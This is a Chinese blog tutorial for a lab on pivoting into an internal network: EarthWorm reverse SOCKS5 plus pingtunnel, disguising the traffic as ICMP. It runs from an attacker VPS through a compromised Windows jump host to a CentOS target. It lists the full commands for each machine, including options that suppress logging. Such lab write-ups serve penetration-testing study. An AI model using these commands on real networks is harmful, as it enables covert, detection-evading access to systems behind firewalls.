---
title: 【ICMP协议隧道代理】ew+pingtunnel组合建立scoks5隧道
categories:
  - 内网攻防
date: 2025-09-12
image: images/62.webp
---
# ew+pingtunnel组合建立scoks5隧道
## 介绍
```
EarthWorm是一款用于开启 SOCKS v5 代理服务的工具，基于标准 C 开发，可提供多平台间的转接通讯，用于复杂网络环境下的数据转发。
Pingtunnel 是一种通过 ICMP 发送 TCP/UDP 流量的工具。其是最流行的一款ICMP代理工具，提供对tcp/udp/sock5流量伪装成icmp流量进行转发的功能。
需要root或者administrator/system权限。
```
## 环境
A攻击机器：windows11（自己的电脑）（**10.10.10.131**）
B代理机器（VPS，服务端）：kali（**10.10.10.133**）
C跳板机器：windwos Server 2012（已攻入的服务器）（**20.20.20.134，10.10.10.135**）
D目标机器：centos 7（**20.20.20.130**）（搭建了一个小皮靶场）
## 实验效果
在已经拿到公网win7服务器的前提下，通过ew与pingtunnel搭建能通往winserver2008的隧道，获取winserver2008的服务器权限。
## 实验准备
工具：ew、pingtunnel、proxifer（代理工具）
```
https://github.com/idlefire/ew
https://github.com/esrrhs/pingtunnel
proxifer官网自行下载
```
## 实验步骤
### B代理机器执行
```
./ew_for_linux64 -s rcsocks -l 10080 -e 8898
```
**10080作为连接隧道的端口，8898作为隧道的通道，可以想象为，通向内网主机的路口为10080，走的这条路为8898。8898上所有的人（流量）都会通往10080这个路口。**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912132739.png)
### B代理机器执行
```
./pingtunnel -type server -noprint 1 -nolog 1
```
**意思是将ew启动的sock5协议转换为icmp协议来隐藏传输**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912132900.png)
### C跳板机器执行
```
pingtunnel.exe -type client -l 127.0.0.1:9999 -s 10.10.10.133 -t 10.10.10.133:8898 -sock5 -1 -noprint 1 -nolog 1

10.10.10.133：为VPS地址。
```
**意思是8898这条路上的sock5流量信息隐藏为icmp类型的数据在本C跳板机的9999端口进行转发。**
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133238.png)
### C跳板机器执行
```
ew.exe -s rssocks -d 127.0.0.1 -e 9999
```
**在本C跳板机9999端口开启转发流量**
如果出现错误，请以**管理员身份**运行即可。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133258.png)
### kali上出现OK字样时表示代理搭建完成
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133354.png)
使用A机器（自己的机器）win11，进行代理端口：
```
10.10.10.133 10080 
```
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133335.png)
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912133858.png)
成功访问到D目标机器小皮面板。
![image.png](https://blogslimer.oss-cn-shanghai.aliyuncs.com/blog/20250912134124.png)
